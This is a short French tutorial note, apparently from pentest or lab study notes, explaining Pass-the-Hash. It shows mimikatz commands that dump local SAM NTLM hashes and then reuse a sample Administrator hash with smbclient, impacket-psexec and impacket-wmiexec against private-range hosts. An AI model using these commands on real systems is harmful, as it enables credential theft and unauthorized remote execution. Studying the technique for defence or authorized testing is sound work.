## Pass The Hash

Nous allons tout d'abord illustrer la technique de Pass the Hash (PtH). Cette technique permet de s'authentifier auprès d'une ciblelocale ou distante à l'aide d'une combinaison valide de nom d'utilisateur et de hachage NTLM, plutôt qu'avec un mot de passe en clair. Ceci est possible car les hachages de mots de passe NTLM/LM ne sont pas salés et restent statiques d'une session à l'autre. De plus, si nous découvrons un hachage de mot de passe sur une cible, nous pouvons l'utiliser pour nous authentifier non seulement auprès de cette cible, mais aussi auprès d'une autre, à condition que cette dernière possède un compte avec le même nom d'utilisateur et le même mot de passe. Pour exécuter du code, quel qu'il soit, ce compte doit également disposer de privilèges d'administrateur sur la seconde cible.

```bash
mimikatz # privilege::debug
Privilege '20' OK

mimikatz # token::elevate
...

mimikatz # lsadump::sam
...
RID  : 000001f4 (500)
User : Administrator
  Hash NTLM: 7a38310ea6f0027ee955abed1762964b
...


Une fois le hash récupéré via mimikatz on peut s'en servir pour 

smbclient -L //192.168.56.211 -U Administrator%7a38310ea6f0027ee955abed1762964b --pw-nt-hash

ou

impacket-psexec -hashes 00000000000000000000000000000000:7a38310ea6f0027ee955abed1762964b Administrator@192.168.50.212

ou

impacket-wmiexec -hashes 00000000000000000000000000000000:7a38310ea6f0027ee955abed1762964b Administrator@192.168.50.212
```


